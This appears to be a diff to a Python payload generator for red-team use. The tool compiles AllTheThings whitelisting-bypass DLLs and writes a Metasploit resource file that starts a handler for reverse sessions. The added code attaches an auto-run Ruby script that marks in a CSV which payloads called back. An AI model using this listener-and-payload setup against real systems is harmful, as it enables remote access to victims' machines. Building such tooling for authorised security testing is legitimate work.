@@ -120,7 +120,9 @@ class Generator():
             "cp ./GenerateAll/allthethings.cs ./AllTheThings/AllTheThings/Program.cs >/dev/null 2>&1",
             "mono --runtime=v4.0 nuget.exe restore ./AllTheThings/AllTheThings.sln >/dev/null 2>&1",
             "mdtool build ./AllTheThings/AllTheThings/AllTheThings.csproj >/dev/null 2>&1",
-            "cp ./AllTheThings/AllTheThings/bin/Debug/AllTheThings.dll ./GenerateAll/AllTheThings_" + name + ".dll >/dev/null 2>&1",
+            "cp ./AllTheThings/AllTheThings/bin/Debug/AllTheThings.dll ./GenerateAll/AllTheThings_{0}\
+            .dll >/dev/null 2>&1".format(
+                name),
             "sleep 10"
         ]
 
@@ -134,12 +136,28 @@ set TimestampOutput true
 set VERBOSE true
 set ExitOnSession false
 set EnableStageEncoding true
+set AutoRunScript ./GenerateAll/payloadtracker.rc
 set LHOST {0}
 set LPORT {1}
 set payload {2}
 run -j'''.format(host, port, payload)
 
         with open('./GenerateAll/gr8sct.rc', 'w+') as f:
+            f.write(msfrc)
+
+    def genUUIDTrackingResouceFile(self):
+        msfrc = '''<ruby>
+if session.payload_uuid.respond_to?(:puid_hex) && uuid_info = framework.uuid_db[session.payload_uuid.puid_hex]
+	f = open("./GenerateAll/analyst.csv", "r+")
+	f.each_line do |line|
+		if line.include? uuid_info["PayloadUUIDName"].to_s
+			f.puts line.gsub("FALSE", "TRUE")
+		end
+	end
+	f.close
+end
+</ruby>'''
+        with open('./GenerateAll/payloadtracker.rc', 'w+') as f:
             f.write(msfrc)
 
     def createAnalystCSVFile(self):
